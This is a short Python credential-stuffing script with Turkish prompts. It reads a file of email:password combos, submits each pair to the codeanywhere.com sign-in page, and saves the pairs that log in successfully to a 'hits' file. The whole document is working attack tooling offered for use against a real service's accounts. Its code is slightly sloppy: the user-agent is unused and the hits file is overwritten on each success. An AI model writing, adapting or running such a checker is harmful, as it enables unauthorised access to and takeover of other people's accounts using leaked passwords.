import requests
from bs4 import BeautifulSoup
import time
import os

giris = input(str("Dosya ismi:"))
a = open(giris,"r").readlines()
file = [s.rstrip() for s in a]
for lines in file:
    combo = lines.split(":")
    user_data = {
        'login_email': ''+combo[0],
        'login_password': ''+combo[1],
    }
    user_agent = {'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36'}
    with requests.session() as req:
        url = "https://codeanywhere.com/signin"
        r = req.get(url)
        Soup = BeautifulSoup(r.content,"html5lib").encode("utf-8")
        giris_yap = req.post(url,data=user_data)
        if "Invalid login" in giris_yap.text:
            print("Yanlis hesap - ",combo[0],combo[1])
        else:
            hit = open("hits.txt","w")
            print("Dogru Hesap + ",combo[0],combo[1])
            hit.write(combo[0])
            hit.write(":")
            hit.write(combo[1])
            hit.writelines("")
            hit.close()

